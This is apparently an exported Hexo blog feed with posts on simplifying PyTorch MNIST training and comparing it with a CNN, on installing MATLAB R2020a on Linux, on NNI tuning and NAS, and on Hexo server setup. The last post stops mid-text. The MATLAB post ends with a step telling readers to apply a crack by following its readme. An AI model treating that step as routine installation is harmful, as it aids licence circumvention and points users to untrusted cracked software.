<h2 id="Where-can-be-simplified-using-PyTorch-feature"><a href="#Where-can-be-simplified-using-PyTorch-feature" class="headerlink" title="Where can be simplified using PyTorch feature?"></a>Where can be simplified using PyTorch feature?</h2><h3 id="choosing-from-torch-nn-functional"><a href="#choosing-from-torch-nn-functional" class="headerlink" title="choosing from torch.nn.functional"></a>choosing from torch.nn.functional</h3><p>In previous code, we must manually define a function <code>nll</code> for calculating loss, which can be replaced by <code>torch.nn.functional</code>.</p>
<p>This stuff contains lots of functions, so that we needn’t implement each function we use, which is quite convenient.</p>
<h2 id="extending-torch-nn-Module"><a href="#extending-torch-nn-Module" class="headerlink" title="extending torch.nn.Module"></a>extending torch.nn.Module</h2><p>we can define our whole neural network as a class, whose super class is <code>torch.nn.Module</code>. In this way, parameters can be stored inside this object, which is friendly for us to program.</p>
<h2 id="using-layer-objects-from-torch-nn"><a href="#using-layer-objects-from-torch-nn" class="headerlink" title="using layer objects from torch.nn"></a>using layer objects from torch.nn</h2><p>The model previous code uses is exactly a linear layer, which can be replaced by <code>torch.nn.Linear</code>, which contains parameters within it.</p>
<p>What’s more, pooling layer, convolution layer are also available to use in <code>torch.nn</code>, which greatly reduces workflow.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">loss_func = F.cross_entropy</span><br><span class="line">model = NeuralNet() <span class="comment"># I am hanhan!</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">train</span>(<span class="params">max_epoch, max_iteration, batch_size, lr</span>):</span></span><br><span class="line">    print(<span class="string">&#x27;training...&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(max_epoch):</span><br><span class="line">        <span class="keyword">for</span> iteration <span class="keyword">in</span> <span class="built_in">range</span>(max_iteration):</span><br><span class="line">            batch_x, batch_y = get_batch_train_data(batch_size, iteration)</span><br><span class="line">            batch_z = model(batch_x)</span><br><span class="line">            loss = loss_func(batch_z, batch_y)</span><br><span class="line"></span><br><span class="line">            loss.backward()</span><br><span class="line">            <span class="keyword">with</span> torch.no_grad():</span><br><span class="line">                <span class="keyword">for</span> p <span class="keyword">in</span> model.parameters():</span><br><span class="line">                    p -= p.grad * lr</span><br><span class="line">                model.zero_grad()</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&#x27;training done.&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    print(<span class="string">&#x27;testing...&#x27;</span>)</span><br><span class="line">    ZTest = model(XTest)</span><br><span class="line">    print(<span class="string">&#x27;loss=%.4f, accuracy=%.4f&#x27;</span> % (loss_func(ZTest, YTest), accuracy(ZTest, YTest)))</span><br><span class="line">    print(<span class="string">&#x27;testing done.&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="modifying-parameters-by-torch-optim"><a href="#modifying-parameters-by-torch-optim" class="headerlink" title="modifying parameters by torch.optim"></a>modifying parameters by torch.optim</h2><p><code>torch.optim</code> includes many methods of optimization, including most commonly-used SGD. With this tool, we needn’t traverse all parameters and subtract its specific value from itself, but only write two lines of code:</p>
<p>Before:<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> torch.no_grad():</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> model.parameters():</span><br><span class="line">        p -= p.grad * lr</span><br><span class="line">    model.zero_grad()</span><br></pre></td></tr></table></figure><br>After:<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> torch.no_grad():</span><br><span class="line">    optimizer.step()</span><br><span class="line">    optimizer.zero_grad()</span><br></pre></td></tr></table></figure><br>Remember to zero grad after each epoch is done, otherwise the gradients will become way too large and get unexpected results.</p>
<p>btw, why I comment that I am hanhan? Because I made mistake on <code>model</code>. Here <code>model</code> must be an instance of <code>NeuralNet</code> rather than a alias, for the values of weights are random. Otherwise, your loss value will always get above 2…</p>
<h3 id="loading-dataset-and-dataloader"><a href="#loading-dataset-and-dataloader" class="headerlink" title="loading dataset and dataloader"></a>loading dataset and dataloader</h3><p>How to import?</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> torch.utils.data <span class="keyword">import</span> TensorDataset, DataLoader</span><br></pre></td></tr></table></figure>
<p>How to declare?<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">train_set = TensorDataset(XTrain, YTrain)</span><br><span class="line">train_loader = DataLoader(train_set, batch_size=bs, shuffle=<span class="literal">True</span>)</span><br><span class="line">valid_set = TensorDataset(XValid, YValid)</span><br><span class="line">valid_loader = DataLoader(valid_set, batch_size=bs * <span class="number">2</span>, shuffle=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><br>Where is the validation set? I just generate the validation set by extracting one tenth of data of training set. This trick is learnt from “microsoft/ai-edu”.</p>
<p>Since we have things prepared, the whole training code is simple:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">train</span>():</span></span><br><span class="line">    print(<span class="string">&#x27;training...&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(max_epoch):</span><br><span class="line">        model.train() <span class="comment"># written before training</span></span><br><span class="line">        <span class="keyword">for</span> batch_x, batch_y <span class="keyword">in</span> train_loader: <span class="comment"># traversal simplified</span></span><br><span class="line">            batch_z = model(batch_x)</span><br><span class="line">            loss = loss_func(batch_z, batch_y)</span><br><span class="line">            loss.backward()</span><br><span class="line">            optimizer.step()</span><br><span class="line">            optimizer.zero_grad()</span><br><span class="line">        model.<span class="built_in">eval</span>() <span class="comment"># written before validating</span></span><br><span class="line">        <span class="keyword">with</span> torch.no_grad():</span><br><span class="line">            valid_loss = <span class="built_in">sum</span>(loss_func(model(batch_x), batch_y) <span class="keyword">for</span> batch_x, batch_y <span class="keyword">in</span> valid_loader) / num_valid</span><br><span class="line">        print(<span class="string">&quot;epoch %d, validation loss=%.4f&quot;</span> % (epoch, valid_loss))</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&#x27;training done.&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="Switch-to-CNN"><a href="#Switch-to-CNN" class="headerlink" title="Switch to CNN"></a>Switch to CNN</h2><p>CNN is widely used when data is images. Now let’s try to solve MNIST with CNN, just to feel how powerful CNN is.</p>
<p>In fact, most of the code remain the same. The only area we need to modify is in the definition of class, replacing linear layer with more complex layers.</p>
<p>Here is the code:<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">from</span> torch <span class="keyword">import</span> nn, optim</span><br><span class="line"><span class="keyword">from</span> torch.nn <span class="keyword">import</span> functional <span class="keyword">as</span> F</span><br><span class="line"><span class="keyword">from</span> torch.utils.data <span class="keyword">import</span> TensorDataset, DataLoader</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># class MNIST(nn.Module):</span></span><br><span class="line"><span class="comment">#     def __init__(self):</span></span><br><span class="line"><span class="comment">#         super(MNIST, self).__init__()</span></span><br><span class="line"><span class="comment">#         self.conv1 = nn.Conv2d(1, 16, kernel_size=3, stride=2, padding=1)</span></span><br><span class="line"><span class="comment">#         self.conv2 = nn.Conv2d(16, 16, kernel_size=3, stride=2, padding=1)</span></span><br><span class="line"><span class="comment">#         self.conv3 = nn.Conv2d(16, 10, kernel_size=3, stride=2, padding=1)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#     def forward(self, batch_x):</span></span><br><span class="line"><span class="comment">#         batch_x = batch_x.view(-1, 1, 28, 28)</span></span><br><span class="line"><span class="comment">#         batch_x = F.relu(self.conv1(batch_x))</span></span><br><span class="line"><span class="comment">#         batch_x = F.relu(self.conv2(batch_x))</span></span><br><span class="line"><span class="comment">#         batch_x = F.relu(self.conv3(batch_x))</span></span><br><span class="line"><span class="comment">#         batch_x = F.avg_pool2d(batch_x, 4)</span></span><br><span class="line"><span class="comment">#         return batch_x.view(-1, batch_x.size(1))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">draw</span>(<span class="params">X</span>):</span></span><br><span class="line">    print(X.shape)</span><br><span class="line">    plt.imshow(X.reshape((<span class="number">28</span>, <span class="number">28</span>)), cmap=<span class="string">&#x27;gray&#x27;</span>)</span><br><span class="line">    plt.show()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_data</span>():</span></span><br><span class="line">    path = Path(<span class="string">&#x27;data/mnist/mnist.pkl&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> path.exists():</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data/mnist/mnist.pkl&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            (XTrain, YTrain), (XTest, YTest), _ = pickle.load(f, encoding=<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> XTrain, YTrain, XTest, YTest</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(FileNotFoundError)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_validation_set</span>(<span class="params">k=<span class="number">10</span></span>):</span></span><br><span class="line">    <span class="keyword">global</span> num_train, XTrain, YTrain</span><br><span class="line">    num_valid = num_train // k</span><br><span class="line">    num_train -= num_valid</span><br><span class="line">    XValid, YValid = XTrain[:num_valid], YTrain[:num_valid]</span><br><span class="line">    XTrain, YTrain = XTrain[num_valid:], YTrain[num_valid:]</span><br><span class="line">    <span class="keyword">return</span> XValid, YValid, num_valid</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">XTrain, YTrain, XTest, YTest = read_data()  <span class="comment"># train: 50000, test: 10000</span></span><br><span class="line">num_train = XTrain.shape[<span class="number">0</span>]</span><br><span class="line">num_test = XTest.shape[<span class="number">0</span>]</span><br><span class="line">XValid, YValid, num_valid = generate_validation_set(k=<span class="number">10</span>)</span><br><span class="line">XTrain, YTrain, XValid, YValid, XTest, YTest = <span class="built_in">map</span>(torch.tensor, (XTrain, YTrain, XValid, YValid, XTest, YTest))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">accuracy</span>(<span class="params">batch_z, batch_y</span>):</span></span><br><span class="line">    temp = torch.argmax(batch_z, dim=<span class="number">1</span>)</span><br><span class="line">    r = (temp == batch_y)</span><br><span class="line">    <span class="keyword">return</span> r.<span class="built_in">float</span>().mean()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Lambda</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, func</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(Lambda, self).__init__()</span><br><span class="line">        self.func = func</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, x</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.func(x)</span><br><span class="line"></span><br><span class="line"><span class="comment"># hyper-parameter</span></span><br><span class="line">bs = <span class="number">64</span></span><br><span class="line">lr = <span class="number">0.1</span></span><br><span class="line">momentum = <span class="number">0.9</span></span><br><span class="line">max_epoch = <span class="number">20</span></span><br><span class="line"><span class="comment"># essential stuff</span></span><br><span class="line">loss_func = F.cross_entropy</span><br><span class="line"><span class="comment"># model = MNIST()</span></span><br><span class="line">model = nn.Sequential(</span><br><span class="line">    Lambda(<span class="keyword">lambda</span> x: x.view(-<span class="number">1</span>, <span class="number">1</span>, <span class="number">28</span>, <span class="number">28</span>)),</span><br><span class="line">    nn.Conv2d(<span class="number">1</span>, <span class="number">16</span>, kernel_size=<span class="number">3</span>, stride=<span class="number">2</span>, padding=<span class="number">1</span>),</span><br><span class="line">    nn.ReLU(),</span><br><span class="line">    nn.Conv2d(<span class="number">16</span>, <span class="number">16</span>, kernel_size=<span class="number">3</span>, stride=<span class="number">2</span>, padding=<span class="number">1</span>),</span><br><span class="line">    nn.ReLU(),</span><br><span class="line">    nn.Conv2d(<span class="number">16</span>, <span class="number">10</span>, kernel_size=<span class="number">3</span>, stride=<span class="number">2</span>, padding=<span class="number">1</span>),</span><br><span class="line">    nn.ReLU(),</span><br><span class="line">    nn.AvgPool2d(<span class="number">4</span>),</span><br><span class="line">    Lambda(<span class="keyword">lambda</span> x: x.view(x.size(<span class="number">0</span>), -<span class="number">1</span>)),</span><br><span class="line">)</span><br><span class="line"><span class="comment"># <span class="doctag">NOTE:</span> relu is different in these two forms!(F.relu vs nn.ReLU)</span></span><br><span class="line">optimizer = optim.SGD(model.parameters(), lr=lr, momentum=momentum)</span><br><span class="line"><span class="comment"># datasets and dataloaders</span></span><br><span class="line">train_set = TensorDataset(XTrain, YTrain)</span><br><span class="line">train_loader = DataLoader(train_set, batch_size=bs, shuffle=<span class="literal">True</span>)</span><br><span class="line">valid_set = TensorDataset(XValid, YValid)</span><br><span class="line">valid_loader = DataLoader(valid_set, batch_size=bs * <span class="number">2</span>, shuffle=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">train</span>():</span></span><br><span class="line">    print(<span class="string">&#x27;training...&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(max_epoch):</span><br><span class="line">        model.train()</span><br><span class="line">        <span class="comment"># training: using training set</span></span><br><span class="line">        <span class="keyword">for</span> batch_x, batch_y <span class="keyword">in</span> train_loader:</span><br><span class="line">            <span class="comment"># forward</span></span><br><span class="line">            batch_z = model(batch_x)</span><br><span class="line">            <span class="comment"># backward</span></span><br><span class="line">            loss = loss_func(batch_z, batch_y)</span><br><span class="line">            loss.backward()</span><br><span class="line">            optimizer.step()</span><br><span class="line">            optimizer.zero_grad()</span><br><span class="line">        model.<span class="built_in">eval</span>()</span><br><span class="line">        <span class="comment"># inference: using validation set</span></span><br><span class="line">        <span class="keyword">with</span> torch.no_grad():</span><br><span class="line">            valid_loss = <span class="built_in">sum</span>(loss_func(model(batch_x), batch_y) <span class="keyword">for</span> batch_x, batch_y <span class="keyword">in</span> valid_loader) / num_valid</span><br><span class="line">        print(<span class="string">&quot;epoch %d, validation loss=%.4f&quot;</span> % (epoch, valid_loss))</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&#x27;training done.&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    print(<span class="string">&#x27;testing...&#x27;</span>)</span><br><span class="line">    ZTest = model(XTest)</span><br><span class="line">    print(<span class="string">&#x27;loss=%.4f, accuracy=%.4f&#x27;</span> % (loss_func(ZTest, YTest), accuracy(ZTest, YTest)))</span><br><span class="line">    print(<span class="string">&#x27;testing done.&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">train()</span><br><span class="line">test()</span><br></pre></td></tr></table></figure></p>
<h2 id="Result-Comparision"><a href="#Result-Comparision" class="headerlink" title="Result Comparision"></a>Result Comparision</h2><h3 id="Linear"><a href="#Linear" class="headerlink" title="Linear"></a>Linear</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">training...</span><br><span class="line">epoch 0, validation loss&#x3D;0.0032</span><br><span class="line">epoch 1, validation loss&#x3D;0.0028</span><br><span class="line">epoch 2, validation loss&#x3D;0.0026</span><br><span class="line">epoch 3, validation loss&#x3D;0.0025</span><br><span class="line">epoch 4, validation loss&#x3D;0.0024</span><br><span class="line">epoch 5, validation loss&#x3D;0.0024</span><br><span class="line">epoch 6, validation loss&#x3D;0.0023</span><br><span class="line">epoch 7, validation loss&#x3D;0.0023</span><br><span class="line">epoch 8, validation loss&#x3D;0.0023</span><br><span class="line">epoch 9, validation loss&#x3D;0.0022</span><br><span class="line">epoch 10, validation loss&#x3D;0.0022</span><br><span class="line">epoch 11, validation loss&#x3D;0.0022</span><br><span class="line">epoch 12, validation loss&#x3D;0.0022</span><br><span class="line">epoch 13, validation loss&#x3D;0.0022</span><br><span class="line">epoch 14, validation loss&#x3D;0.0022</span><br><span class="line">epoch 15, validation loss&#x3D;0.0022</span><br><span class="line">epoch 16, validation loss&#x3D;0.0022</span><br><span class="line">epoch 17, validation loss&#x3D;0.0021</span><br><span class="line">epoch 18, validation loss&#x3D;0.0022</span><br><span class="line">epoch 19, validation loss&#x3D;0.0021</span><br><span class="line">training done.</span><br><span class="line">testing...</span><br><span class="line">loss&#x3D;0.2707, accuracy&#x3D;0.9251</span><br><span class="line">testing done.</span><br></pre></td></tr></table></figure>
<h3 id="CNN"><a href="#CNN" class="headerlink" title="CNN"></a>CNN</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">training...</span><br><span class="line">epoch 0, validation loss&#x3D;0.0042</span><br><span class="line">epoch 1, validation loss&#x3D;0.0020</span><br><span class="line">epoch 2, validation loss&#x3D;0.0018</span><br><span class="line">epoch 3, validation loss&#x3D;0.0017</span><br><span class="line">epoch 4, validation loss&#x3D;0.0015</span><br><span class="line">epoch 5, validation loss&#x3D;0.0012</span><br><span class="line">epoch 6, validation loss&#x3D;0.0015</span><br><span class="line">epoch 7, validation loss&#x3D;0.0013</span><br><span class="line">epoch 8, validation loss&#x3D;0.0012</span><br><span class="line">epoch 9, validation loss&#x3D;0.0011</span><br><span class="line">epoch 10, validation loss&#x3D;0.0011</span><br><span class="line">epoch 11, validation loss&#x3D;0.0012</span><br><span class="line">epoch 12, validation loss&#x3D;0.0011</span><br><span class="line">epoch 13, validation loss&#x3D;0.0013</span><br><span class="line">epoch 14, validation loss&#x3D;0.0010</span><br><span class="line">epoch 15, validation loss&#x3D;0.0010</span><br><span class="line">epoch 16, validation loss&#x3D;0.0010</span><br><span class="line">epoch 17, validation loss&#x3D;0.0010</span><br><span class="line">epoch 18, validation loss&#x3D;0.0010</span><br><span class="line">epoch 19, validation loss&#x3D;0.0009</span><br><span class="line">training done.</span><br><span class="line">testing...</span><br><span class="line">loss&#x3D;0.1135, accuracy&#x3D;0.9666</span><br><span class="line">testing done.</span><br></pre></td></tr></table></figure>
<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>Life is short, I use PyTorch.</p>
<p>CNN, yyds!</p>
]]></content>
      <tags>
        <tag>Deep-Learning</tag>
      </tags>
  </entry>
  <entry>
    <title>MATLAB R2020a Linux安装笔记</title>
    <url>/2021/10/13/MATLAB-R2020a-Linux%E5%AE%89%E8%A3%85%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="prologue"><a href="#prologue" class="headerlink" title="prologue"></a>prologue</h2><p>现在我跟Windows的一大约束是Microsoft Office和MATLAB，经历一系列折腾终于在linux下安装了MATLAB，<del>跟Windows的羁绊又少了一条</del></p>
<a id="more"></a>
<h2 id="acquisition"><a href="#acquisition" class="headerlink" title="acquisition"></a>acquisition</h2><p><a href="https://zhuanlan.zhihu.com/p/255088205"></a></p>
<h2 id="installation"><a href="#installation" class="headerlink" title="installation"></a>installation</h2><p>把iso文件下载下来后，有两种办法可以做：</p>
<ol>
<li>mount这个iso，然后安装</li>
<li>解压出来，然后安装</li>
</ol>
<p>我使用了后者，不过其实没啥区别。</p>
<p>不过直接<code>./install</code>在我的机子上跑不起来，会报错，如下：</p>
<img data-src="http://qiniu.garen-wang.top/static/images/MATLAB-R2020a-Linux安装笔记/2021-10-13_12-52.png">
<p>网上找了很久，最后发现可以运行<code>/bin/glnxa64</code>下的<code>install_unix_legacy</code>。</p>
<p>能打开java GUI，但是报了error，如下：</p>
<img data-src="http://qiniu.garen-wang.top/static/images/MATLAB-R2020a-Linux安装笔记/2021-10-13_12-55.png">
<p>这种情况下，只需要cd到用户根目录，然后再运行即可。</p>
<p>记得运行的时候加上sudo，因为需要往<code>/usr/local</code>里面安装。</p>
<h2 id="post-installation"><a href="#post-installation" class="headerlink" title="post-installation"></a>post-installation</h2><h3 id="message-from-wizard"><a href="#message-from-wizard" class="headerlink" title="message from wizard"></a>message from wizard</h3><img data-src="http://qiniu.garen-wang.top/static/images/MATLAB-R2020a-Linux安装笔记/post_installation.png">
<p>其实这些supported compilers在用的久的linux机器里面都有的，这一步可以直接忽略。</p>
<p><a href="https://wiki.archlinux.org/title/MATLAB#Install_supported_compilers"></a></p>
<h3 id="HiDPI"><a href="#HiDPI" class="headerlink" title="HiDPI"></a>HiDPI</h3><p>打开安装好之后的MATLAB会发现界面小的离谱，这就涉及HiDPI的有关设置。</p>
<p><a href="https://wiki.archlinux.org/title/HiDPI#MATLAB"></a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span> matlab -r <span class="string">&quot;s = settings;s.matlab.desktop.DisplayScaleFactor.PersonalValue=2;quit&quot;</span></span><br></pre></td></tr></table></figure>
<h3 id="crack"><a href="#crack" class="headerlink" title="crack"></a>crack</h3><p>按照Crack里面的readme做就可以了。</p>
]]></content>
  </entry>
  <entry>
    <title>NNI Exploration Learning Notes</title>
    <url>/2021/01/23/NNI-Exploration-Learning-Notes/</url>
    <content><![CDATA[<h2 id="未完成任务"><a href="#未完成任务" class="headerlink" title="未完成任务"></a>未完成任务</h2><h3 id="Task-2-2"><a href="#Task-2-2" class="headerlink" title="Task 2.2"></a>Task 2.2</h3><p>-[] HPO<br>-[] 在搜索空间中选择随机结构，并验证性能<br>-[] NAS</p>
<h3 id="Task-3-1"><a href="#Task-3-1" class="headerlink" title="Task 3.1"></a>Task 3.1</h3><p>-[] 跑通NNI Feature Engineering Sample</p>
<h3 id="Task-3-2"><a href="#Task-3-2" class="headerlink" title="Task 3.2"></a>Task 3.2</h3><h4 id="Task-3-2-1"><a href="#Task-3-2-1" class="headerlink" title="Task 3.2.1"></a>Task 3.2.1</h4><h4 id="Task-3-2-2"><a href="#Task-3-2-2" class="headerlink" title="Task 3.2.2"></a>Task 3.2.2</h4><h3 id="Task-4"><a href="#Task-4" class="headerlink" title="Task 4"></a>Task 4</h3><a id="more"></a>
<h2 id="HPO"><a href="#HPO" class="headerlink" title="HPO"></a>HPO</h2><p>超参调优在NNI中比较好实现，只要有参数和模型的搜索空间，就可以利用NNI自带的tuner来做调参工作。</p>
<h3 id="Assessor"><a href="#Assessor" class="headerlink" title="Assessor"></a>Assessor</h3><p>在数据量较大的情况下，一般一个trial普遍会比较久，NNI支持Assessor，实现在调优过程中类似“剪枝”的功能，提供了提前终止某些trial的策略以节省实验时间。</p>
<p>需要添加assessor时只需在<code>config.yml</code>中添加，这里以Curvefitting为例：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">assessor:</span></span><br><span class="line">  <span class="attr">builtinAssessorName:</span> <span class="string">Curvefitting</span></span><br><span class="line">  <span class="attr">classArgs:</span></span><br><span class="line">    <span class="attr">epoch_num:</span> <span class="number">10</span></span><br><span class="line">    <span class="attr">threshold:</span> <span class="number">0.9</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="NAS"><a href="#NAS" class="headerlink" title="NAS"></a>NAS</h2><h3 id="搜索空间的编写"><a href="#搜索空间的编写" class="headerlink" title="搜索空间的编写"></a>搜索空间的编写</h3><p>在做NAS的过程中，我们需要手动写出待搜索的模型的类，我们借助NNI中的mutables来实现模型搜索空间的构建。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NeuralNet</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(NeuralNet, self).__init__()</span><br><span class="line">        self.conv1 = mutables.LayerChoice([</span><br><span class="line">            nn.Conv2d(<span class="number">3</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">1</span>, padding=<span class="number">1</span>),</span><br><span class="line">            nn.Conv2d(<span class="number">3</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">1</span>, padding=<span class="number">2</span>)</span><br><span class="line">        ], key=<span class="string">&#x27;conv1&#x27;</span>)</span><br><span class="line">        self.mid_conv = mutables.LayerChoice([</span><br><span class="line">            nn.Conv2d(<span class="number">8</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">1</span>, padding=<span class="number">1</span>),</span><br><span class="line">            nn.Conv2d(<span class="number">8</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">1</span>, padding=<span class="number">2</span>)</span><br><span class="line">        ], key=<span class="string">&#x27;mid_conv&#x27;</span>)</span><br><span class="line">        self.conv2 = nn.Conv2d(<span class="number">8</span>, <span class="number">16</span>, <span class="number">5</span>, <span class="number">1</span>)</span><br><span class="line">        self.pool = nn.MaxPool2d(<span class="number">2</span>, <span class="number">2</span>)</span><br><span class="line">        self.func1 = nn.Linear(<span class="number">16</span> * <span class="number">5</span> * <span class="number">5</span>, <span class="number">120</span>)</span><br><span class="line">        self.func2 = nn.Linear(<span class="number">120</span>, <span class="number">84</span>)</span><br><span class="line">        self.func3 = nn.Linear(<span class="number">84</span>, <span class="number">10</span>)</span><br><span class="line">        self.input_switch = mutables.InputChoice(n_candidates=<span class="number">1</span>, key=<span class="string">&#x27;skip&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, x</span>):</span></span><br><span class="line">        x = self.pool(F.relu(self.conv1(x)))</span><br><span class="line">        x = self.mid_conv(x)</span><br><span class="line">        skip_x = self.input_switch([x])</span><br><span class="line">        x = self.conv2(x)</span><br><span class="line">        <span class="keyword">if</span> skip_x <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            x = x + skip_x</span><br><span class="line">        x = self.pool(F.relu(x))</span><br><span class="line">        x = x.view(-<span class="number">1</span>, <span class="number">16</span> * <span class="number">5</span> * <span class="number">5</span>)</span><br><span class="line">        x = F.relu(self.func1(x))</span><br><span class="line">        x = F.relu(self.func2(x))</span><br><span class="line">        x = self.func3(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br></pre></td></tr></table></figure>
<p><code>mutables.LayerChoice</code>实现了神经网络模型中一层的多选一，待选的神经网络层只需要在里面列出来即可。例如上面的代码，就实现了3*3和5*5两种二维卷积层的选择空间。</p>
<p><code>mutables.InputChoice</code>实现了可跳过连接。在上述代码中，表示了mid_conv层是可跳过层。可跳过层的前后代码保持不变，在可跳过层则需要从可能连接加入到后一层的输出中。</p>
<h3 id="Classical-NAS"><a href="#Classical-NAS" class="headerlink" title="Classical NAS"></a>Classical NAS</h3><h3 id="One-shot-NAS"><a href="#One-shot-NAS" class="headerlink" title="One-shot NAS"></a>One-shot NAS</h3><h3 id="DARTS"><a href="#DARTS" class="headerlink" title="DARTS"></a>DARTS</h3><h3 id="ENAS"><a href="#ENAS" class="headerlink" title="ENAS"></a>ENAS</h3>]]></content>
      <tags>
        <tag>NNI</tag>
      </tags>
  </entry>
  <entry>
    <title>My Hexo Blog Configuration</title>
    <url>/2021/01/08/My-Hexo-Blog-Configuration/</url>
    <content><![CDATA[<p>芜湖！起飞！今天备案终于审核通过了！捣鼓了一下，终于把博客弄得像模像样的，就顺带记录一下！</p>
<h2 id="序幕"><a href="#序幕" class="headerlink" title="序幕"></a>序幕</h2><p>军训汇操在早上结束了，回到宿舍一打开手机就连收到三条信息，终于给爷备案好了！</p>
<img data-src="http://qiniu.garen-wang.top/static/images/My-Hexo-Blog-Configuration/WeChat_Image_20210108221637.jpg">
<img data-src="http://qiniu.garen-wang.top/static/images/My-Hexo-Blog-Configuration/WeChat_Image_20210108221657.jpg">
<p>我啪的一下就开始准备我的博客了，很快啊！</p>
<a id="more"></a>
<h2 id="博客框架"><a href="#博客框架" class="headerlink" title="博客框架"></a>博客框架</h2><p>博客使用Hexo搭建，用了NexT主题(NexT.Gemini)，在GitHub上就能找到这个主题。</p>
<p>Hexo只要有npm就可以安装了，跑条命令安装一下就行。</p>
<p>Hexo的操作可以直接看官方文档，也很容易懂，这里不赘述。</p>
<p>GitHub Pages之前就配置好了，现在主要是需要配置到我的服务器上面去。</p>
<h2 id="Hexo同步至服务器"><a href="#Hexo同步至服务器" class="headerlink" title="Hexo同步至服务器"></a>Hexo同步至服务器</h2><p>首先，在服务器上面安装一下git和nginx。在备案没有成功的时候，可以直接用买服务器时给的弹性公网IP直接去上，效果是一样的。</p>
<p>按照我的印象，当没有安装nginx时，在浏览器中输入ip打开，是会出现小恐龙的，而安装了nginx之后就成了404。这说明nginx确实已经开始起作用了，安装正常。</p>
<p>然后可以在服务器那端用ssh免密登录，粗略流程是这样的：</p>
<ol>
<li>在本机用<code>ssh-keygen</code>创建一个ssh公钥和私钥。</li>
<li>在服务器的<code>.ssh</code>目录创建一个<code>authorized_keys</code>，再<code>chmod</code>一下。</li>
<li>把ssh公钥写到<code>authorized_keys</code>上面去。</li>
</ol>
<p>这个时候，只要本机有私钥，服务器有公钥，我们就可以通过一个ssh命令免密远程登录：</p>
